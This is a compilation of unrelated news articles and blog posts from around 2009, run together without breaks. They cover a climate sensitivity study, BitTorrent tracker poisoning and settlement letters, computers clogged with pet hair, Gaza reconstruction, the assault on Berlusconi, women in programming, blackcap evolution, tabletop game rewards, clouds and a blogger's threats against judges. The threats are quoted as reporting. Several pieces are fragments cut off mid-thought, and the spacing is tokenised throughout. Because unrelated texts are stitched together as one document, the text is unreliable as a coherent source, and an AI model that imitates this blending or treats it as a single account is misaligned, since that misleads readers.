The invasions of Iraq and Afghanistan have shown much more than the American military ’s capacity for ‘ regime change ’ — they have shown the limits of American military power and the supreme difficulty of filling the vacuum that ‘ regime change ’ creates .
Does anyone seriously think that another war and occupation in the Middle East is in the United States ’ strategic interests or politically feasible for the Obama administration ?

In the long term , the Earth 's temperature may be 30 - 50 % more sensitive to atmospheric carbon dioxide than has previously been estimated , reports a new study published in Nature Geoscience .
The results show that components of the Earth 's climate system that vary over long timescales -- such as land - ice and vegetation -- have an important effect on this temperature sensitivity , but these factors are often neglected in current climate models .
Dan Lunt , from the University of Bristol , and colleagues compared results from a global climate model to temperature reconstructions of the Earth 's environment three million years ago when global temperatures and carbon dioxide concentrations were relatively high .
The temperature reconstructions were derived using data from three million - year - old sediments on the ocean floor .
Lunt said , " We found that , given the concentrations of carbon dioxide prevailing three million years ago , the model originally predicted a significantly smaller temperature increase than that indicated by the reconstructions .
This led us to review what was missing from the model . "
The authors demonstrate that the increased temperatures indicated by the reconstructions can be explained if factors that vary over long timescales , such as land - ice and vegetation , are included in the model .
This is primarily because changes in vegetation and ice lead to more sunlight being absorbed , which in turn increases warming .
Including these long - term processes in the model resulted in an increased temperature response of the Earth to carbon dioxide , indicating that the Earth 's temperature is more sensitive to carbon dioxide than previously recognised .
Climate models used by bodies such as the Intergovernmental Panel on Climate Change often do not fully include these long - term processes , thus these models do not entirely represent the sensitivity of the Earth 's temperature to carbon dioxide .
Alan Haywood , a co-author on the study from the University of Leeds , said " If we want to avoid dangerous climate change , this high sensitivity of the Earth to carbon dioxide should be taken into account when defining targets for the long - term stabilisation of atmospheric greenhouse - gas concentrations . "
Lunt added : " This study has shown that studying past climates can provide important insights into how the Earth might change in the future . "
( a ) shows predicted global temperatures when processes that adjust on relatively short - term timescales ( for example sea-ice , clouds , and water vapour ) are included in the model
( b ) includes additional long - tem processes that adjust on relatively long timescales ( vegetation and land - ice ) .

Content industries are pushing " three - strikes " Internet disconnection laws around the world , but how accurate are the detection methods used to bust online infringers ?
Princeton computer scientist Mike Freedman says that there 's still a big need for improvement after one of his projects attracted 100 warning and settlement letters in September 2009 alone , despite not actually sharing the files in question .
The root of the problem , he noted in a blog entry last week , is that some investigators do an absolute minimum of work before dashing off a warning letter .
In this case , the " Video Protection Alliance " sent Freedman 's CoralCDN project letters without apparently verifying that CoralCDN was swapping the files in question ; instead , it looks as though the Alliance grabbed IP addresses from a BitTorrent tracker and trusted the tracker to be totally accurate .
A BitTorrent tracker coordinates the various peers in a " swarm , " keeping track of which users have which bits of a particular file .
When a new machine joins a swarm looking for that file , it is given a list of all peers which are sharing parts of it .
The system is n't necessary — newer " trackerless " BitTorrent setups can operate without a tracker — but it remains common , and it's a simple way for investigators to quickly grab long lists of " pirate " IP addresses .
This only works if a tracker is passing out reliable information — a faulty assumption .
Tracker operators are n't interested in making their trackers simple enforcement tools for the content police , so some popular sites purposely add legitimate , non-infringing addresses to their trackers .
The goal is to poison the well just enough that content owners can't use tracker data with impunity , but not so much that it degrades performance of the swarm .
It 's hardly a secret , either , as groups like The Pirate Bay have publicly announced their support of the scheme .
Academic researchers have known about it for years , too ; a well - publicised study from mid-2008 found that " indirect " detection of infringement was a common practice , and that with little trouble researchers could even " frame " a device like a networked printer .
Some links to Freedman 's CoralCDN project were added to trackers for just this reason , and it did n't take long before the letters began pouring in .
According to Freedman , they are n't simple warning letters , either ; the Video Protection Alliance also demands that letter recipients contact it in order to pay a settlement , or risk a federal copyright infringement trial .
Indeed , settlements appear to be VPA 's entire business ; the company exists to be the " fast , secure and convenient way to settle your copyright violations online " for a " nominal " fee .
The fee is nominal enough to ensure that it 's cheaper to settle than to hire a lawyer .
As the company 's FAQ says , " It is likely that the cost incurred to retain a lawyer will exceed the settlement amount offered .
The decision to hire a lawyer is entirely up to you . "
VPA is a newcomer to the " settle or we 'll sue " world , launching earlier this year with a focus on " the adult industry . "
Other firms such as MediaSentry ( which used to do RIAA investigations ) make it a policy to connect directly to infringers ' machines and download at least parts of files , but Freedman believes that VPA is taking a shortcut and just grabbing addresses from BitTorrent trackers , then blasting out its notices .
The takeaway is plain : we can argue about whether Internet sanctions and disconnections are good policy , and we can argue about how best to implement that policy and its safeguards , but any such policies that act on these accusations from rightsholders have to be grounded on good data .
If not , printers , open content delivery networks , and plenty of individuals could find themselves in the Internet penalty box , trying frantically to prove a negative .
As a computer technician , I have seen some pretty interesting computer problems .
The majority of problems I encounter in the home market are adware , spyware or connectivity problems and the occasional hardware problem .
The hardware problems are usually caused by simple manufacturer fault ( as in , it was going to fail at one point anyway ) or a power surge .
However , occasionally I find a computer that was killed by pet hair , dust or cigarette smoke .
These three eventually find their way into the computers fans or heatsinks causing the computer to overheat and die .
Over the years I have come across a few bad cases of this and I would love to share some of the photos with you .
Warning : Some of these photos are pretty gross .
I purposely kept them at a high resolution so you can see them in all their glory .
Click on any of the thumbnails to view the high resolution version .
Edit : Added other computer technicians pictures that they sent in
Computer 1
A client brought in a laptop that kept restarting during bootup .
At first , I thought this would be your typical “ Windows blue screen of death with the automatic restart option switched on ” but the computer did n’t even get to the Windows stage , it would crash out in the CMOS .
Suspecting a overheating problem , I entered the BIOS , looked at the temperatures and noticed that they extremely high and climbing .
Seconds later , the computer shut itself off again .
I knew this was definitely going to be a temperature problem .
On the outside , the computer seemed in relatively good shape as seen in the photo below :
I opened up the laptop and looked at the internal parts .
The insides were relatively dust free with the exception of a little surface dust in the CPU fan , but nothing that would totally clog it up .
So I continued on and took out the heatsink , heatpipe and fan section that is highlighted in red :
I separated the heat sink and the fan and found the problem ; a bad case of pet hair .
The fan would pull in pet hair through the air vents shown in the first picture and try and push them out the exhaust air vents .
However , due to the fine fins on the heatsink it was getting caught and was building up :
I pulled out the hair using tweezers , gave the computer a blast with some compressed air , put it back together and it worked perfectly .
Temperature was normal and it ran for a good 5 hours without problems before the client picked it up again .
Here is the photo of the ‘ hair monster ’ I removed :
Computer 2
This computer came in because it would n’t boot at all ; as if there was no power .
This could be caused by a dead power supply , dead CPU or dead motherboard .
I opened it up to find out and was greeted with this :
The video card GPU ’s heatsink and fan is in there somewhere :
The power supply is barely able to breathe :
.. and the back side of the power supply doesnt look to great either :
To top it off , the side case fan is barely managing to spin :
Computer 3 :
This computer came in because it would n’t boot at all .
From the smell of it , I was pretty sure the death of this computer was caused by cigarette smoke .
You see , when cigarette smoke and dust collide in a computer , it produces this weird dusty - tar combination that has a pasty texture .
Its brown , it smells bad and is hard to remove .
It turns out that the CPU had overheated and died on this computer because airflow generated by the fan was unable to get air into the heatsink fins ; here ’s why :
I tried to pull it off as a whole by getting my tweezers in between the heatsink fins and pushing the the layer of dust / tar up :
One of our forum members recently encountered a computer like this and complained about how gross it is , then another member replied :
“ Just think , for the pain that they gave you with their computer , imagine whats happening in their lungs ”
I ’m just glad that I havent encountered a cockroach infestation inside a computer like some computer technicians have .
Other Computer Technicians pictures that have been sent in
David Jone ’s Encounter
“ The pictures attached of a computer I had to clean , probably the worse one , I now carry a small low air compressor with me when I go out to the premises to carry out repairs , with the drought there seems to be more dirty ones about ”
This one also looks like a smokers computer .
Pete ’s Encounter
“ Pete here – I am a tech based on the Gold Coast .
Thought you ’d like to see Kermit …..
One of my customers had some weird things going on with their monitor ( strange colours and lines on the screen ) .
I immediately thought graphics card , but when I took the side off I was surprised to find a very small ( and very dead ) frog sitting on top of the card .
It had “ leaked ” frog juice onto the graphics card components and caused a bit of corrosion .
The strange thing is that Kermit was completely dry so may have been there for some time .
I would have thought there would have been a problem earlier , while he was still wet ! ”
Anyone else encountered computers like this ?
If you have your own pictures I would love to see them .

Gotta give Square Enix credit .
For an enormous ( and still conservative ) company , it sure is trying hard to expand its horizons .
Just listen to company boss Yoichi Wada talk .

" Even now , there have been people in Japan using the label youge - ( Western games ) with a terribly discriminatory meaning , " Wada said in a recent interview on Japanese TV in which he discussed Square Enix and Modern Warfare 2 , which it published in Japan .
" I 'd like them to try it once .
If they play it once , they 'd realize how incorrect that label is . "
The term " youge - " has been used to separate Japanese games from foreign titles , which , until recently , were believed to have little or no appeal to Japanese gamers .
" Game " ( ゲーム）refers to video games .
" Youge - " ( 洋ゲー）means something else — these games are different , they are the other .

Continuing , Wada noted that Western developers really started to come into their own in 2005 , but that there was a lag in importing these titles into Japan .
" Japanese game makers have been overwhelming strong , " Wada said .
" Thus , perhaps it was not necessary to look outside . "
Times are changing , and so is Square Enix , it seems .

Tents setup have been set up for families whose homes were destroyed by the Israeli assault on Gaza nearly one year ago .

ABBED
RABBO

During the last few weeks Gazans were given a brief reprieve from the oncoming winter as an unseasonal snap of warmish , sunny weather held off winter rain and plummeting temperatures .
But , during a tour of northern Gaza last week , the UN Humanitarian Coordinator for the occupied Palestinian territory , Maxwell Gaylard , and the Association of International Development Agencies ( AIDA ) called on Israel to open its border crossings immediately to avert a further deterioration in the humanitarian situation on the ground .
“ With winter rains and cold weather now imminent , the people of Gaza are even more desperately in need of construction materials such as cement , roofing tiles and glass to build and repair homes destroyed and damaged during the Israeli military offensive of 2008 / 2009 , ” said Gaylard .
During Israel ’s intensive bombing campaign in December / January Gaza ’s infrastructure was heavily targeted leading to the destruction and damage of thousands of homes .
“ Gaza urgently requires 268,000 square meters of glass for windows and 67,000 square meters of glass for solar water heaters or enough glass to cover more than 30 football pitches .
More than 500 children are still living in tents , ” Mike Bailey from Oxfam told IPS .
Damage caused to Gaza ’s water , sanitation and electricity systems , exacerbated by Israel ’s crippling blockade which forbids the import of most essential spare parts and fuel , has further limited the ability of aid agencies to supply essential services .
The lack of concrete water storage tanks means that fresh water can only enter water pipes when there is electricity to power water pumps .
Backup generators — which rely on fuel — are needed to ensure power cuts do not lead to water shortages and pollution of water .
“ The humanitarian situation is going to deteriorate if something does n’t give , ” Gaylard told IPS during a tour of the Ezbt Abbed Rabbo area of the northern Gaza Strip .
“ We are reaching out to the international community .
We are appealing to the member countries of the UN on a regular basis about this continuing crisis …
We are holding discussions with the UN General Assembly and the UN Security Council .
One would hope that the message would be getting out after the Goldstone report , ” said Gaylard .
“ We are continuing talks with the Israeli government but pressure must be brought to bear on those responsible for keeping the border crossings closed , ” Gaylard told IPS .
Fifty meters away from where the media gathered to hear the UN coordinator address the escalating humanitarian crisis , dozens of Gazan families were living the crisis first - hand .
Muhammad Zaid ’s five - story home — which took four years to build and was home to 16 persons , the youngest a one - year - old — was flattened during 15 days of intensive Israeli shelling at the beginning of the year , forcing the family to flee .
For the first five months after the war Zaid and his family lived under the caved - in bottom floor of the building .
For the last five months the Zaids have lived in a tent supplied by the UN Relief and Works Agency ( UNRWA ) , the UN agency responsible for Palestine refugees .
Despite the recent unusually warm and dry weather , the heavens opened up for one night last week and rainwater flooded their tent as the family desperately tried to salvage belongings .
“ We were awake the whole night scooping water out and trying to dig a small ditch around the tent to prevent more water flooding in but it did n’t help .
The children were terrified and screaming .
It was so cold , ” Zaid told IPS .
However , when the winter rains begin to flood his tent on a regular basis in the near future Zaid , who is unemployed and in huge debt , will face the additional problems of having only intermittent electricity , and no running water .
“ I have spent over 3,000 dollars of borrowed money for a new refrigerator and stove and some other basic appliances but we have no heater and the electricity keeps cutting , ” said Zaid .
Several kilometers away , near the border with Israel , mother of eight Taghreed Abu Amrayn , showed IPS her new “ home , ” a tent attached to the remains of her former three - story house , as she jiggled 20 - month old Safedin on her hip .
“ I ’m not sure how we will cope with winter as heating and electricity are a big problem and the children are always getting sick .
I think the phosphorous bombs that were dropped nearby may have affected them . ”
“ Apart from the health issues we still live in fear on a daily basis as Israel continues to bomb these areas , ” Amrayn told IPS .
Nearby the Abu Amrayns , Rifat Bakri , 28 , and Wissam Amoud , 27 , were using improvisation to try and overcome the absence of construction material .
They had “ rebuilt ” their former garage and mechanical workshop with cardboard boxes .
“ We could n’t just sit around , we needed to get back to work .
These boxes have provided a provisional garage for the short - term but when it rains in winter they will become water - logged and I ’m not sure what we will do then , ” Bakri told IPS .
“ This abysmal situation ca n’t continue .
People are desperate .
Enough is enough .
It is time for the blockade to be ended and for humanity to return to Gaza , ” Bailey told IPS .

Advertisement Prime Minister Silvio Berlusconi of Italy is recovering in hospital after an assault left his face covered in blood following a rally in Milan .
He suffered two broken teeth , a minor nose fracture and cuts to his lip after being struck by a man wielding a souvenir model of the city 's cathedral .
Mr Berlusconi , 73 , tried to assure supporters afterwards he was OK .
The alleged attacker , who has a history of mental illness , has been charged with throwing the souvenir .
Alleged attacker Massimo Tartaglia was detained at the scene Massimo Tartaglia , 42 , had no previous criminal record , police were quoted as saying .
After the attack on Sunday evening the prime minister , looking dazed , was helped to his feet by aides and put in a car .
He got out and tried to climb on the car to show he was all right , before being driven away .
It was a typical show of defiance by a political fighter , says the BBC's Duncan Kennedy in Rome .
Mr Berlusconi insisted he was well at the hospital .
' Metal or plaster '
ANALYSIS Duncan Kennedy , BBC News , Rome
The attack will undoubtedly raise questions about security surrounding the prime minister .
Like most heads of government , he travels with a large team of body guards and aides but Mr Berlusconi is a gregarious figure who likes to mingle with ordinary people .
He is also a divisive individual in Italian politics , with opinion polls showing a broad split between voters .
After months of personal scandal involving his private life , he has become an even more polarising leader , though the motivation for this physical attack is not yet clear .
Mr Berlusconi had been greeting supporters in a square in Milan when the assault took place .
There are said to have been scuffles between hecklers and security staff during the rally .
At one point in his speech , Mr Berlusconi responded to his critics in Italy by declaring himself to be " good - looking " and " a decent chap " .
The Italian leader was apparently signing autographs when he was struck with the souvenir .
Video of the assault shows Mr Berlusconi suddenly grimacing in pain .
It is not clear from the footage what happened but the object appears to have been thrown at his face .
Police charged Mr Tartaglia with aggravated assault for hurling the miniature replica at Mr Berlusconi .
ASSAULTS ON PRIME MINISTERS Italy 's Silvio Berlusconi physically attacked in street in December 2004 in Rome , and December 2009 in Milan Turkey 's Recep Tayyip Erdogan punched in the stomach by a man as he is about to deliver a speech Trabzon , August 2009 New Zealand 's John Key shoved and grabbed by two protesters at Maori event , February 2009

The replica of the cathedral , famous for its gothic spires , was initially said to be made of metal but later reports suggested it was plaster .
Under pressure
The Italian prime minister was previously assaulted in the street on New Year 's Eve 2004 , when a tourist visiting Rome struck him with a camera at a rally in the capital 's Piazza Navona .
His attacker , a bricklayer from northern Italy , reportedly told police he had attacked Mr Berlusconi because he hated him .
The politician suffered a bruise .
Mr Berlusconi has been under pressure in recent months .
His private life has been in the spotlight , amid allegations that he slept with prostitutes , and after his wife filed for divorce .
He has dismissed accusations of ties to the Mafia , and criminal cases against him have resumed after a law giving him immunity was overturned .
A week ago tens of thousands of people attended an anti-Berlusconi rally in Rome .

Kathy Sierra has been tweeting about Women in Technology over the last week or so .
Today ’s tweet really got me thinking .
Tired of being a Woman In Tech .
I ’m a programmer .
I ’m female .
Does it have to be SO political / significant ?
Sometimes a coder ’s just a coder .
- Kathy Sierra
While I certainly have n’t been in the field as long as Kathy , I am a female programmer .
And I have n’t really thought about it since college .
Until recently .
It ’s not significant to me ; I do n’t think it is significant to people I work with .
And yet in some ways it is .
My response to this tweet was :
@KathySierra sorry ; you ’re a VISIBLE female programmer & a role model for the next generation ( aka me ) ; do n’t have any at work so branch out - Jeanne Boyarsky
And this is why I ’ve been thinking about it .
Whether I notice or not , I am starting to become a role model to some people .
I know because they told me !
Sometimes it is people I know and sometimes it is people who read my posts on JavaRanch .
High schoolers
Kathy has also been writing about getting girls into IT in the first place .
Do high - schoolers choose a career based on who speaks at conferences ?
To claim even a trickle - down effect ( respect ! exposure ! ) feels wrong .
- Kathy Sierra @jeanneboyarsky agree in principle , just that conference keynoters are NOT on teen girl ’s radar and do n’t “ count ” as visibility / motivation .
- Kathy Sierra
I agree with her that high schoolers do n’t choose a career based on who speaks at conferences .
I do think some more awareness of women in tech is helpful though .
In the Spring , I volunteered at a high school robot competition .
A college professor asked me if ANY of teams had girls on them .
With thoughts like that influencing careers , it is n’t very encouraging .
I heard my share of “ girls should n’t go into IT ” when I was in high school as well – 1995 - 1999 .
( The answer in case you are wondering is of course there are girls on teams .
In fact , there were a few all girl teams . )
This school year , I started volunteering as a mentor with FIRST robotics as a high school programming mentor .
The lead student programmer is also female .
Nobody thinks much of this .
Which is the point .
People want to be accepted .
Being accepted for being a techie is better than people thinking differently of you because you are female .
It ’s just a part of me as is my brown hair .
Or at least that is how it should work .
Female Architects
I think another reason for the dearth of female role models in technology is that less females tend to stick with it over time .
@KathySierra : “ women speakers in tech ? ” I always wonder why ‘ women ’ are different .
Do n’t we want good _people_ in these sessions ?
– Steve Johnson
I think Steve makes an excellent point .
Of course we want good people in these sessions .
And I do see women at conferences .
I just tend to see them in “ softer ” roles like talking about social media than “ harder ” programming parts .
And absolutely favor strength over gender when choosing conference speakers .
Where I work , there are n’t yet any female architects .
And by that I mean the really senior folks who have been doing this 20 - 30 years like Bear Bibeault and Ernest Friedman Hill rather than the watered down “ developer with 7 years experience ” definition .
I think this is due to a number of things :
The culture of the past – If many years ago people were pushed a certain way , it affects the present .
I ca n’t speak to the past since I was n’t there at that point .
But I do think it has an impact .
The greater chance a woman would go into management than stay in technology – soft vs hard skills ?
preference ?
social conditioning ?
path of least resistance ?
Interest in keeping up with technology – you have to really like something to stay with it in your free time ; money is n’t enough
Yes , I want to be an architect someday .
But I want to get there because I ’m good at what I do , not because I am female .
What can we do
Thinking about three things I and people I know do to make things a tiny bit better :
Like what you do ; be passionate about what you do – Male or female , this is the core of why technology is fun !
If you happen to be female , let this excitement shine through and let others see it .
I ’m volunteering as a programming mentor for robotics because I enjoy it .
Being a positive role model for the students is a side effect .
Point out the “ she ” – If you are female and someone refers to you as “ he ” or “ sir ” , correct them .
This is how we introduce visibility into the fact that there are strong techies out there .
Scott Selikoff does so if someone calls me “ he ” in a blog comment .
Some people do this so often at JavaRanch that Campbell Ritchie has made it a running joke .
But it helps .
It serves as little reminders that we do have strong female technical females running around .
Not to the the teens of course .
But to the existing programmers .
Look to the future – Things change over time .
The senior architects of the today were largely born in the 50’s , 60’s and 70’s .
This was before people had the internet in their homes .
The students of today are growing up with social networking .
Computers are n’t as geeky .
There is more social interaction in the job .
In another couple of decades people my age will be those senior architects and then there will be more female role models .
[ edited to add “ when choosing conference speakers . ” per comments on redit ]
The millisecond - scale operation of an analog on - off switch is an eternity to a computer .
Does that tremulous signal mean a finger meant to push the button once or twice ?
Is the computer being misled by microvoltages created by electronic interference ?
Did a user really push the button at all ?
As one authority puts it , " Switches can do some really odd things .
. . .
Switches do n't make and break cleanly on the time scales of digital systems . "
Thus ...

Birds that spend winter in the UK find food in many gardens Bird - feeders , hung in many a garden , can affect the way our feathered friends evolve , say scientists .
European birds called blackcaps follow a different " evolutionary path " if they spend the winter eating food put out for them in UK gardens .
The birds ' natural wintering ground is southern Spain , where they feed on the fruits that grow there .
Researchers describe the impact this well - intentioned activity has had on the birds in Current Biology journal .
Dr Martin Schaefer from the University of Freiburg in Germany led the research .
He and his team found that blackcaps that migrated to the UK for the winter were in the very earliest stages of forming a new species .
He explained that some blackcaps ( Sylvia atricapilla ) would always have migrated " a little further north " than others and eventually " ended up in Britain in the winter " .
It 's positive news for us , because it means not all the changes [ humans ] produce are necessarily bad
Martin Schaefer , University of Freiburg " But those birds would have had nothing to eat , " he said .
It was when garden bird feeders became more popular in the UK , that an evolutionary division began to emerge .
" As soon as the British provided a lot of bird food , those birds would have had a much higher probability of surviving the winter . "
And because the UK is closer to their breeding ground , those birds would also have returned earlier to claim the best territory .
The researchers , from Germany and Canada , set out to discover if the birds that spent the winter availing themselves of garden bird - feeders were in fact a distinct group .
To do this , they studied the blackcaps at a breeding ground in Germany .
The team were able to use a chemical " signature " from the birds ' claws to identify where they spent the winter , and what food they ate .
" Then we took blood samples and analysed those to assess whether ... we had two distinct populations .
And that 's exactly what we found , " said Dr Schaefer .
The blackcaps have adapted to their shorter journey and different food supply
" To a very large extent the birds only mate [ with ] birds with the same overwintering grounds as them . "
This initial " reproductive isolation " , Dr Schaefer explained , is the very first step in the evolution of a new species .
" This tells us that by feeding birds in winter we ... produce an evolutionary split .
And we have produced these initial steps in as little as 50 years . "
The team also observed differences in the birds ' beaks , wings and plumage .
Blackcaps that migrated along the shorter route to the UK had rounder wings , and longer , narrower beaks .
The scientists said these differences were evidence that the birds had adapted to their shorter journey , and to eating seeds and fat from bird - feeders , rather than fruit from shrubs and trees .
But , Dr Schaefer pointed out that the evolution of a new bird species " could take 100,000 to a million years " .
" At this stage this is reversible , " he added .
" And it 's hard to envision a species change , because if there 's another economic crisis and people stop feeding the birds , the whole system might just collapse . "
Man-made change
In this case , Dr Schaefer thinks the human impact on blackcaps has been a positive thing .
" [ The birds have ] found a better overwintering area that is closer to the breeding ground , where they can obtain food easily .
" And I also think its positive news for us , because it means not all the changes we produce are necessarily bad , and that some species have the potential to adapt quickly to the changes . "
Grahame Madge from the Royal Society for the Protection of Birds ( RSPB ) said that this was " a fascinating piece of research " and that it fitted in with the birds adapting to a changing climate .
" Blackcaps have been able to start this behaviour because of the milder winter we 've experienced in the last few decades , " he said .
" And because they 're getting food , this reinforces the behaviour and will enable them to survive a colder winter [ in the UK ] . "
Joseph Tobias , a biologist from the Oxford University in the UK , agreed that the UK climate may have been a more important factor contributing to the changes observed in the blackcaps .
" The study clearly demonstrates that a new lineage has arisen ... [ but ] it does n't actually demonstrate that food hand - outs by humans are the root cause , " Dr Tobias said .
" It is possible that the main reason for the switch in migratory behaviour was a warming winter climate in the UK .
The best we can say on the basis of the evidence is that the increase in bird - feeding in the UK may have contributed to the switch in behaviour . "
Mr Madge added that putting food out for birds in the winter was " very important " and that many birds " need the energy boost at this time of year " .

The U.N. 's decision this week to investigate whether some of its climate change research had been manipulated constitutes a " direct rebuke " of the Obama administration , Rep. Darrell Issa ( R - Calif . ) said Friday .
The White House 's unwillingness to open a similar inquiry could now only be characterized as " a sad abdication of their responsibility to ensure that U.S. policies are not driven by corrupted science and data , " the congressman added .
ADVERTISEMENT
“ The very integrity of the report that the Obama administration has predicated much of its climate change policy has been called into question and it is unconscionable that this administration and Congress is willing to abdicate responsibility of uncovering the truth to the United Nations , " explained Issa , the ranking member on the House Oversight and Government Reform Committee .
Motivating Issa 's calls for a probe into climate change research , and the U.N. 's decision to launch one , was the publication last month of thousands of e-mails and other documents that global warming skeptics say prove the phenomenon does not exist .
Some of those e-mails contained discussions about how to best portray data sets , among other topics .
Scientists maintain their comments have been taken out of context , but those who fiercely oppose the climate change thesis argue the e-mails invalidate all the research .
The U.N. announced it would probe that data this week , mostly because some of the research in question touches on related work either completed or promoted by its own Intergovernmental Panel on Climate Change ( IPCC ) .
But the White House has largely dismissed the litany of Republican calls to open an inquiry into that research — Issa 's included — because its top scientists contend one controversy hardly undermines decades of more reliable research on climate change .
" It is important to understand that these kinds of controversies and even accusations of bias and improper manipulation are not all that uncommon in science , in all branches of science , " said Dr. John Holdren , the president 's science adviser .
I ’ve got a little story for you today , it came from my last game session and it centers around the kinds of rewards we , as GMs , give to players .
Sure there are rewards of straight in - game currency , there are rewards of items that boost the characters ’ stats and abilities , and there are rewards of plot relevant items or information that help move the story along .
There are also rewards that are fluffier and have less effect on the mechanical aspects of the game while increasing player enjoyment .
These rewards are fairly intangible to the game as a set of mechanics , but they are relevant to the game as a story that is occurring .
The Story
The last game session I ran had two very interesting moments in it .
The first moment was when the players were debating where to sell off some loot they had acquired from a dungeon .
After much debate they chose a religious college that is very reminiscent of Cambridge .
In bartering with the Deans of the college , they had the chance to take 15,000 Saren ( currency in the world setting ) or 13,000 Saren and receive honorary degrees .
As if they were working with one group mind , they all perked up and said hell yeah the honorary degrees .
A good 10 minutes was spent discussing what these would entail and that they would have no game effect .
Another 5 minutes was spent with them deciding what their degrees would be .
One character chose to have a doctorate in inter-dimensional relations , another chose to have a doctorate in “ conflict management ” ( i.e. Assassination ) , while the final character chose a degree in Hoplology , the study of combative behavior and performance .
These degrees gave them no extra skills or in - game powers or abilities .
Just honorary degrees for cutting their prices .
Still , it was one of the highlights of the game and one of the most enjoyed moments .
The second moment in this game that featured an “ intangible ” reward was when the players decided to pool some of their experience to purchase a special power called Homebase .
It gave them an unstatted , non game affecting “ Place ” of their own design .
The power states that the players work out details of the base with the Game Master , but that it does n’t grant any kind of mechanical bonuses and only acts as a location that the players own and can make use of .
The players decided that the base was going to be a floating island ( an island that floats high in the stratosphere ) since they had an airship ( which can take them from place to place ) as a reward from another adventure .
Once the base was acquired in - game , through a short - formed encounter with an old man looking for the resting place of his son , a good hour was spent determining the exact details of the homebase .
Though it involved no real gameplay , and the night had many great moments , this was the most engrossed I saw the players all night .
While there were things we could have gotten to if we had left the details of the island abstract , it was more fun for the players to work out their holdings .
The interesting twist , most of what they set up on the island were future expansions , such as the village for the support staff , the farm so they could be self - sufficient , and the magic items that would keep the river flowing and create waterfalls .
The level they purchased the homebase at granted them very little , just access to the island and accommodations for 3 to 4 people .
They were prepping for the time when they could purchase the upgrade and make nifty , completely thematic elements .
While they did eventually brainstorm ways they could use the land to turn a profit ( outside of the power ’s stipulation that the base would sustain itself without constant PC upkeep ) the elements they focused most on were completely without tangible , in - game , mechanical reward .
This is a picture of their final drawing of the island as it will be in the future .
The Moral ?
While there was loot of a more standard variety ( +1 swords , cash in the pocket , etc. ) it was obtained and quickly forgotten .
Even the more story - driven , fluff based rewards that had a mechanical effect ( a magical library that granted them 1 free skill level each , once ) from earlier sessions were not received with nearly as much enthusiasm .
Why were the honorary degrees and the homebase so much more fun ?
Character development .
The rewards were more about adding something fun to the characters in terms of building the story of the characters up .
The honorary degrees had no effect , but they gave the players a different sense of their characters .
The homebase radically changed the feel of the game for the players .
Their adventures for the night continued without paying another visit to , or use of , the homebase , but it kept getting brought up .
Both of these elements added something to the characters that enabled new growth and goals .
A skill , a more game affecting power , or an item that granted a new ability per the rules might have affected the game more , but the intangible rewards that added to the characters affected the “ play ” more .
Jeff Tidball put a great article up on gameplaywright about how a story placed behind a minor worth item increases its value exponentially .
It is a perfect example of this effect .
Think about the rewards that you are giving out as a Game Master and their effects on character development and the story .
I ’m willing to bet that rewards focusing more on the character development and story will be more fun for the players than just plain mechanical game affecting rewards .
So , what do you think ?
What are some of the coolest rewards that you ’ve given or gotten in a game ?
Were they more based on mechanics and loot or where they more character centric ?
I ’ve been building up a list of these for a while , but have n’t gotten around to posting them .
Enjoy !

The spectacular clouds that look as if they were sculpted out of the sky
They drift through the atmosphere , looking as if they have been elaborately sculpted by an artist from above .
The fleecy white clouds that usually litter the sky like cotton wool have been carved into waves and volcanoes and shapes of extraordinary beauty .
Cumulus Clouds blanket the skies
From swirling Lenticular clouds to pouch shaped Mammatus clouds these are some of the rarest formations known to meteorologists .
Clouds are visible mass of droplets , suspended in the atmosphere above the surface of the Earth or another planetary body .
Roll clouds loom over Sydney , Australia
A Shiveluch Volcano cloud erupts in the atmosphere
Generally they consist of water droplets , ice crystals or a mixture of both , and the shapes of the various cloud forms are caused by a number of factors such as temperature , the ratio of water and ice , the altitude of the cloud and the windspeeds within it .
The exact forms are also governed by a complex interplay of wind , rising and falling air , and changes in humidity and density .
Classified into four categories ( High Level , Mid-Level , Low - level and Vertically developed ) , meteorologists use clouds to predict climate and weather patterns and even studying the impact of global warming .

The Mammatus clouds , the strange globular clouds pictured below , which resemble drops of oil poured into a murky pond , appear to herald the appearance of an alien spacecraft , here to cause havoc .
In fact , it is a rare but perfectly natural ( and perfectly harmless , provided you do not try to fly through it in light aircraft ) meteorological phenomenon .
Mammatus clouds are a sign of the massive quantities of water vapour that are held in the languid summer air
Strange clouds such as these are probably behind one of the most perplexing phenomena of modern times - the UFO sighting .
Earlier this year , the Cloud Appreciation Club , launched ' The Cloud Collector 's Handbook ' to enable cloud - spotters to identify rare and unusual formations .
The argument about whether hate speech is protected by the 1st Amendment has been postponed .
“ A judge declared a mistrial Monday in the case against a New Jersey blogger accused of making death threats against three federal judges in Chicago because they wrote a ruling supporting gun control , ” the Associated Press reports .
“ The mistrial came after the jury sent two notes – one during its first day of deliberation on Friday and another on Monday – saying it was hopelessly deadlocked over charges Hal Turner threatened to kill or assault a federal judge , ” the AP report continues .
“ A retrial was scheduled for March 1 in Brooklyn , where the case was moved based on a change - of - venue request . ”

“ Let me be the first to say this plainly : these Judges deserve to be killed , ” he wrote on his Web site , according to a June MSNBC report .
“ He included their pictures , phone numbers , work address and room numbers along with a photo of the courthouse in which they work and a map of its location , the FBI says . ” .
The AP reports today , “ The only juror to speak to reporters afterward , truck driver Richard Gardiner , said the jury voted 9 to 3 in favor of acquittal , with the majority seeing the government ’s case as weak .
He said he held out for a conviction because he ‘ did think it was a threat . ' ”
The hate free speech argument is also set “ to be continued ” at Turner ’s next trial .
As the Southern Poverty Law Center notes ,
Although Turner is notorious for advocating the assassination of judges and elected officials in rants on broad topics like gun control and hate crimes legislation , the Internet call for violence that finally got him arrested dealt with a relatively obscure topic : legislation that would shift control of Roman Catholic Church affairs in Connecticut from the church to lay members .
“ It is our intent to foment direct action against these individuals personally , ” Turner wrote .
“ These beastly government officials should be made an example of as a warning to others in government : Obey the Constitution or die . ”
He added this warning : “ If any state attorney , police department or court thinks they ’re going to get uppity with us about this , I suspect we have enough bullets to put them down , too . ”
State Capitol Police in Connecticut charged Turner with inciting injury to person or property , punishable by one to 10 years in prison and a fine of up to $ 10,000 .
Vowing to fight extradition to Connecticut , Turner was released from jail in New Jersey on June 10 after posting $ 25,000 bond .

Earlier this year , RAW STORY reported that the announcement that the white supremacist radio host Turner was an FBI informant , which his lawyer revealed in court was a confirmation of what hackers claimed nearly a year prior after allegedly gaining access to his e-mails .
“ In July 2008 , hackers — who may or may not be connected to 4chan — confronted Turner on his Web site ’s forums and claimed they had gained access to his e-mail , uncovering a message allegedly to his FBI handler in which he takes credit for “ flush[ing ] out another crazy , ' ” Stephen Webster reported .
